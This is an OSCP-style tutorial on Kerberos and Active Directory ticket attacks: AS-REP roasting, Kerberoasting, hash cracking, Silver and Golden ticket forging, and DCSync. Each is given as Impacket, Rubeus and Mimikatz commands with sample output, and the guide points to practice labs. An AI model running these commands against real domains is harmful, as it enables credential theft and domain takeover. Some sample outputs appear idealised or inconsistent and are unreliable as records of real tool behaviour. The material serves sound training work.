# Kerberos Authentication & Ticket-Based Attacks

**Track:** Mastering OSCP
**Section:** Active Directory — 021
**Topics:** Kerberos Authentication Flow, AS-REP Roasting, Kerberoasting (Linux & Windows), Golden Ticket, Silver Ticket, DCSync

---

## 1. Kerberos Authentication — The Full Flow

**Kerberos** is a ticket-based, symmetric-key authentication protocol. Unlike NTLM, it never transmits a password (or its hash) across the network after the very first exchange, and relies on a trusted third party — the **Key Distribution Center (KDC)**, running on the Domain Controller — to issue and validate tickets.

### 1.1 Key Components

| Component | Purpose |
|---|---|
| **KDC** | Runs on the DC; contains both the Authentication Service (AS) and Ticket Granting Service (TGS) |
| **TGT** | Ticket Granting Ticket — proves the user's identity to the KDC |
| **TGS** | Ticket Granting Service ticket — grants access to a specific service |
| **SPN** | Service Principal Name — a unique identifier for a service instance |
| **PAC** | Privilege Attribute Certificate — carries the user's SID and group memberships |
| **KRBTGT** | A special built-in account whose key signs every TGT issued in the domain. Compromising it is the basis of a **Golden Ticket** attack |

### 1.2 Step-by-Step Authentication Flow

1. **AS-REQ** — the user sends the KDC an `AS-REQ` containing their username, a timestamp, and that timestamp pre-encrypted with their own password hash (`PA-ENC-TIMESTAMP`). This is the request for a TGT.
2. **KDC validation** — the KDC decrypts the timestamp using the password hash it has on file for that user, and confirms it matches. Critically, the request must fall within a **5-minute window** — this is what prevents replay-style man-in-the-middle attacks.
3. **AS-REP** — once validated, the KDC returns:
   - A **TGT**, encrypted with the `KRBTGT` account's own secret key.
   - A **session key**, encrypted with the user's NTLM hash.
4. **TGS-REQ** — to access a specific service, the user builds an **Authenticator** (containing their client principal name and the current timestamp), encrypts it with the session key from step 3, and sends it to the KDC alongside the TGT and the target service's SPN.
5. **TGS-REP** — the KDC decrypts the TGT, verifies the session key and PAC, then returns a **Service Ticket** encrypted with the target service account's own hash, plus a new session key.
6. **AP-REQ** — the user presents the Service Ticket plus a fresh Authenticator directly to the target service (IIS, MySQL, etc.), which decrypts it, verifies the Authenticator, and grants access — all without the service ever needing to know the user's actual password.

### 1.3 Why the KDC's Trust in `KRBTGT` Is a Structural Weak Point

When the KDC returns a TGT in step 3, that TGT is encrypted with the `KRBTGT` account's secret key. Critically, when a TGT is later presented back to the KDC in step 4, **the KDC does not re-validate the contents of the TGT** — it only checks that the `KRBTGT` key correctly decrypts it. If the encryption checks out, the KDC trusts whatever identity and group memberships are stated inside without further scrutiny.

A useful mental model: think of the TGT like a sealed envelope. The `KRBTGT` signature is the glue holding the envelope shut, and the actual claimed identity (e.g. "Administrator") is just text written on the paper inside. The KDC only checks whether the glue is genuine — it never reads the letter itself, comparing it against anything else. If the glue is real, whatever the letter says is accepted as fact.

The reason the KDC operates this way is scale: it has no practical way to individually re-verify the contents of every TGT presented to it across potentially millions of authentication events. It trusts the `KRBTGT` signature instead, and accepts the ticket's claimed contents wholesale once that signature checks out.

**The exploitable idea:** if an attacker can obtain the `KRBTGT` account's own hash, they can forge a TGT from scratch — claiming to be any user, including a Domain Admin — and the KDC will accept it as genuine, since the signature is valid. This is exactly what a **Golden Ticket** attack does (Section 4).

---

## 2. AS-REP Roasting

### 2.1 The Underlying Misconfiguration

Recall that step 1 of Kerberos authentication (`AS-REQ`) normally requires the client to prove knowledge of the password by pre-encrypting a timestamp. **Kerberos pre-authentication** is what enforces this — but it can be explicitly disabled per-account (the `DONT_REQ_PREAUTH` flag), and sometimes is, whether intentionally or through misconfiguration.

If pre-authentication is disabled for an account, an attacker can request a TGT for that account directly — no password required — and the KDC will return an `AS-REP` response that is partially encrypted with that user's own NTLM hash. That response can then be cracked offline, entirely without ever touching the network again or risking account lockout.

This isn't guaranteed to exist in a given environment, but it's a common enough misconfiguration to always check for.

### 2.2 Requirements to Attempt This Attack

1. Know the domain name.
2. Discover it via `netexec smb <ip> -u Guest -p ''` or `nmap -sCV <ip>`.
3. Add the domain to `/etc/hosts`.
4. **Impacket**'s `GetNPUsers` script performs this attack. A usernames list is optional — if supplied, only those accounts are checked; if omitted, the tool queries anonymously where possible.

### 2.3 Running the Attack (Linux — Impacket)

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.10
```

**Authenticated variant** (with a known low-privilege account, which broadens what can be queried):

```bash
impacket-GetNPUsers inlanefreight.local/htb-student:'HTB_@cademy_stdnt!' -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.129.205.35
```

**Example output** — a list of vulnerable accounts followed by their crackable hashes:

```
amber.smith  2023-03-30 08:40:23.135840  2023-04-06 06:48:23.096956  0x410200
jennasmith   2022-10-14 07:00:00.581111  2023-04-06 06:48:23.096956  0x410200
carole.rose  2022-10-14 07:00:03.377990  2023-04-06 06:48:23.096956  0x410200

$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:20a8d968ad6f2b046dda79b0d17508$5bb9a9b11268fcaee03ef745bdc7af1d38fbd42287...
$krb5asrep$23$jennasmith@INLANEFREIGHT.LOCAL:4883613ebfc2ce3829d46b45d7a60c19$6b9daf6cf3af88a13673c4b9fdf9114e4344d340a...
$krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:8d213c5b84d1eaf9e0f85ce3f6d27bb51b548bcd43e9b922a6a560e42c36fd5b5f394e00b...
```

### 2.4 Cracking the Recovered Hashes

Save the hashes to a file, then crack with Hashcat mode `18200` — dedicated specifically to AS-REP hashes:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### 2.5 Validating the Cracked Credentials

```bash
netexec smb 10.129.205.35 -u username -p pass
```

### 2.6 Windows: AS-REP Roasting with Rubeus

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /dc:10.10.10.10
```
```
[*] Action: AS-REP Roasting
[*] Target Domain          : corp.local
[*] Target DC              : 10.10.10.10

[*] SamAccountName         : jdoe
[*] DistinguishedName      : CN=jdoe,CN=Users,DC=corp,DC=local
[*] UserAccountControl     : 4194304 (DONT_REQ_PREAUTH)
[*] Hash                   : $krb5asrep$23$jdoe@CORP.LOCAL:8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d$1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d...
```

---

## 3. Kerberoasting (SPN Abuse)

Where AS-REP Roasting targets *users* with pre-authentication disabled, **Kerberoasting** targets *service accounts* directly — any account with a registered SPN. Once we've reached hashes for user accounts via AS-REP Roasting, the natural next step is reaching hashes tied to services instead.

### 3.1 Linux — Impacket

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 corp.local/jdoe:Password123!
```
```
ServicePrincipalName             Name       MemberOf                                     PasswordLastSet      LastLogon
--------------------------------  ---------  -------------------------------------------  -------------------  -------------------
MSSQLSvc/DB01.corp.local:1433     svc_sql    CN=Domain Users,CN=Users,DC=corp,DC=local     2023-11-15 14:22:10  2024-01-20 08:15:33

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/DB01.corp.local:1433*$8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d$1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d...
```

### 3.2 Cracking the TGS Hash

```bash
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

Hashcat mode `13100` targets **Kerberos 5 TGS-REP type 23** — the correct mode for a Kerberoasted hash, distinct from the `18200` mode used for AS-REP Roasting.

### 3.3 Windows — Kerberoasting with Rubeus

If already operating from inside a compromised Windows host, Rubeus performs the same attack natively:

```powershell
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```
```
[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,OU=ServiceAccounts,DC=corp,DC=local
[*] ServicePrincipalName   : MSSQLSvc/DB01.corp.local:1433
[*] PwdLastSet             : 11/15/2023 2:22:10 PM
[*] LastLogon              : 1/20/2024 8:15:33 AM
[*] Hash                   : $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/DB01.corp.local:1433*$8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d...
```

> Kerberos is secure by design, but misconfigurations — weak service account passwords, unconstrained delegation, missing SPN validation — create exploitable paths. The OSCP exam specifically tests Kerberoasting, AS-REP Roasting, and basic ticket manipulation. Practice both the Linux (Impacket) and Windows (Rubeus/Mimikatz) tool paths.

---

## 4. Ticket Forging — Silver & Golden Tickets

### 4.1 Comparison

| Feature | Silver Ticket | Golden Ticket |
|---|---|---|
| **Target** | A specific service (SPN) | The entire domain (TGT itself) |
| **Required hash** | The target service account's NTLM hash | The `krbtgt` account's NTLM hash |
| **Scope** | Single machine/service | Domain-wide |
| **Persistence** | Survives that service account's password change | Survives essentially every password change |
| **Detection** | Service logs, unusual SPN access patterns | KDC logs, anomalous ticket lifetimes |

### 4.2 Silver Ticket — The Underlying Idea

If a specific account (say `user1`) has an SPN registered against it — designating it as a service — then requesting a TGS for that service returns a Service Ticket encrypted with the **service account's own hash**, not the user's password.

A **Silver Ticket attack** targets exactly that: forge a Service Ticket directly, entirely bypassing the KDC, using only the service account's own NTLM hash. Because the KDC is never contacted for this forged ticket, the attack leaves comparatively few centralized logs — it targets a *service*, not the domain-wide TGT issuance process.

**Prerequisite:** the target service account's NTLM hash — obtained via Kerberoasting or DCSync (Section 5).

### 4.3 Step-by-Step: Silver Ticket (Linux — Impacket)

```bash
# 1. Get the service account's hash via Kerberoasting or DCSync
# 2. Forge the ticket
impacket-ticketer -spn MSSQLSvc/DB01.corp.local:1433 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -nthash 8846F7EAEE8FB117AD06BDD830B7586C -user-id 1105 svc_sql
```
```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.local/svc_sql
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Saving ticket in svc_sql.ccache
```

```bash
export KRB5CCNAME=svc_sql.ccache
impacket-psexec corp.local/svc_sql@DB01.corp.local -k -no-pass
```
```
[*] Requesting shares on DB01.corp.local.....
[*] Found writable share ADMIN$
[*] Uploading file XyZ123.exe
[*] Opening SVCManager on DB01.corp.local.....
[*] Creating service XyZ123 on DB01.corp.local.....
[*] Starting service XyZ123.....
C:\Windows\system32> whoami
corp\svc_sql
```

### 4.4 Step-by-Step: Silver Ticket (Windows — Mimikatz)

```powershell
.\mimikatz.exe privilege::debug "kerberos::golden /domain:corp.local /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027c6604526b7b16a22e320b76e54a5b /user:Administrator /service:CIFS /target:SQL01.inlanefreight.local /ptt" exit
```

> Despite the command name (`kerberos::golden`), specifying a `/service` and `/target` scopes this ticket down to a Silver Ticket — the underlying Mimikatz command is shared between both attacks; what differs is which hash is supplied and whether a specific service is targeted.

### 4.5 Golden Ticket

> **This attack can only be executed after obtaining the `krbtgt` account's hash.**

Because `krbtgt` signs every TGT in the domain, and because the KDC never re-validates a TGT's *contents* once its signature checks out (see Section 1.3), possessing this one hash is enough to forge a TGT claiming to be *any* user — including built-in Domain Admin — with arbitrary group memberships attached. This grants domain-wide access that survives virtually every remediation short of resetting the `krbtgt` password (twice, due to password history).

### 4.6 Step-by-Step: Golden Ticket (Windows)

**Step 1 — extract the `krbtgt` hash via DCSync:**

```cmd
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```
```
[DC] 'corp.local' will be the domain
[DC] 'krbtgt' will be the user account
[DC] Exporting domain to file 'krbtgt.dit'
[DC] Retrieving krbtgt NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c
```

**Step 2 — forge the Golden Ticket:**

```cmd
mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:8846f7eaee8fb117ad06bdd830b7586c /id:500 /groups:512,513,518,520 /ptt" exit
```
```
User      : administrator
Domain    : corp.local (CORP)
SID       : S-1-5-21-1234567890-1234567890-1234567890
User Id   : 500
Groups Id : *512 513 518 520
ServiceKey: 8846f7eaee8fb117ad06bdd830b7586c - rc4_hmac_nt
Lifetime  : 2/5/2024 10:00:00 AM ; 2/5/2034 10:00:00 AM
RenewMax  : 2/12/2034 10:00:00 AM
-> Ticket : ** Pass The Ticket **
 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart signed
 * KrbCred generated
 * Golden ticket for 'administrator @ corp.local' successfully submitted for current session
```

The `/ptt` flag ("Pass The Ticket") injects the forged ticket directly into the current session, ready for immediate use.

**Step 3 — verify the forged ticket, then use it:**

```cmd
klist
```

```cmd
dir \\DC01.corp.local\C$
```
```
Volume in drive \\DC01.corp.local\C$ has no label.
 Volume Serial Number is 1A2B-3C4D

 Directory of \\DC01.corp.local\C$

02/05/2024  10:15 AM    <DIR>          PerfLogs
02/01/2024  08:30 AM    <DIR>          Program Files
02/01/2024  08:30 AM    <DIR>          Program Files (x86)
02/05/2024  09:45 AM    <DIR>          Users
02/05/2024  10:00 AM    <DIR>          Windows
```

Full, unrestricted access to the Domain Controller's filesystem, granted purely through a forged ticket.

> **Silver Ticket** = service-specific. **Golden Ticket** = domain-wide. Golden requires the `krbtgt` hash. Both bypass normal authentication entirely and survive ordinary password changes. The OSCP exam tests Silver/Golden concepts through Rubeus, Impacket, and Mimikatz.

---

## 5. Domain Controller Synchronization (DCSync)

**DCSync** abuses the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` AD replication privileges to impersonate a legitimate Domain Controller and request password hashes for *any* user in the domain — including `krbtgt` itself, making it the fastest practical route to a Golden Ticket.

### 5.1 Required Privileges

Any of the following group memberships (or an equivalent custom ACL grant of the replication rights) is sufficient:

- `Domain Admins`
- `Enterprise Admins`
- `Backup Operators` (in some configurations)
- A custom ACL explicitly granting replication rights

### 5.2 Step-by-Step: DCSync (Linux — Impacket)

```bash
impacket-secretsdump corp.local/administrator:Password123!@10.10.10.10
```
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
jdoe:1105:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
asmith:1106:aad3b435b51404eeaad3b435b51404ee:b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7:::
svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8:::
[*] Cleaning up...
```

Every user in the domain — with their full NT hash — comes back in a single command, provided the authenticating account holds replication rights.

### 5.3 Step-by-Step: DCSync (Windows — Mimikatz)

```cmd
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
```
```
[DC] 'corp.local' will be the domain
[DC] 'Administrator' will be the user account
[DC] Exporting domain to file 'Administrator.dit'
[DC] Retrieving Administrator NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c
[DC] Retrieving Administrator LM hash: aad3b435b51404eeaad3b435b51404ee
```

> DCSync leaves minimal logs, but does trigger **Event ID 4662** (Object Access) and **5136** (Directory Service Object Modified) on a well-monitored DC. It's the fastest practical path from `Domain Admins`/`Backup Operators` membership to the `krbtgt` hash, and from there to a Golden Ticket and full domain compromise. The OSCP exam frequently tests DCSync via both Impacket and Mimikatz.

---

## 6. Practice Labs

- HackTheBox Active Directory track: https://app.hackthebox.com/tracks/60
- GOAD (Game of Active Directory) — a fully deployable vulnerable AD lab: https://github.com/Orange-Cyberdefense/GOAD
